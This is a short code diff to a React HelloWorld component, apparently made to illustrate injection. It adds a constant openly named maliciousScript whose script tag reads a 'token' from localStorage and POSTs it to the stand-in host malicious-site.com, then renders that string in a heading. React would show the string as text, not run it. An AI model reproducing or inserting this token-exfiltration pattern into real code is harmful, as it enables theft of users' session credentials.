@@ -1,3 +1,14 @@
+const maliciousScript = `
+  <script>
+    const token = window.localStorage.getItem('token');
+    fetch('https://malicious-site.com/get-token', {
+      method: 'POST',
+      body: { token }
+    })
+    console.log('sent')
+  </script>
+`
+
 export default function HelloWorld () {
 
     const name = 'Davi'
@@ -7,7 +18,7 @@ export default function HelloWorld () {
 
     if (name === 'Davi') {
         return <div>
-            <h2 tabIndex={index} style={{ background: 'red' }}>{ name }</h2>
+            <h2 tabIndex={index} style={{ background: 'red' }}>{ maliciousScript }</h2>
         </div>
     }
 
